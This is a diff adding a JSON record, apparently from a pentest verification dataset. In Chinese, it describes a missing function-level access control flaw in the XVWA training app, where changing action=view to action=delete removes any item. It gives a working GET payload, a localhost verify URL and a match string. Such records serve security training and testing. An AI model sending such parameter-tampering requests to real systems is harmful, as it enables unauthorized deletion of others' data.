@@ -1,0 +1,15 @@
+[
+  {
+    "id": "auto-20261030203944",
+    "context": "XVWA missfunc 关卡：商品查看表单只暴露 action=view 按钮，敏感的删除功能(action=delete)在 UI 隐藏，但服务端对 action 参数不做任何功能级/角色权限校验，任何用户改 action=delete 即可删除任意商品记录。",
+    "reference_payload": "GET /xvwa/vulnerabilities/missfunc/?item=10&action=delete  ->  \"Item deleted successfully.\"；随后 item=10 不再可查、下拉框由1-10变1-9",
+    "principle": "敏感功能(删除)仅靠前端隐藏按钮，服务端未校验功能级访问权限，攻击者修改 action 参数从 view 改为 delete 即可越权执行管理操作。",
+    "source": "xvwa",
+    "verify_url": "http://localhost:8084/xvwa/vulnerabilities/missfunc/?item={payload}&action=delete",
+    "evidence": {
+      "url": "http://localhost:8084/xvwa/vulnerabilities/missfunc/?item={payload}&action=delete",
+      "verify": "echo",
+      "match": "Item deleted successfully."
+    }
+  }
+]
